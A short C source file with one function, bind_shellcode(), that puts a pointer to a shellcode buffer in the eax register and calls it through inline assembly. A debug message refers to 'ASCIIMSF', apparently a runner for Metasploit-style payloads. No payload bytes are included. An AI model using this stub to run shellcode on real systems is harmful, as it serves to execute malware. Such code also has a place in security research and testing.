#include <stdio.h>


void bind_shellcode(unsigned char *shellcode) {
	#ifdef PRINT_DEBUG
		printf("exec_shellcode_ASCIIMSF\n ");
		int size=strlen(shellcode);
		printf("shellcode size: %d\n", size);
	#endif

	register unsigned char* r asm("eax");
	r=shellcode;
	asm("call *%eax;");
}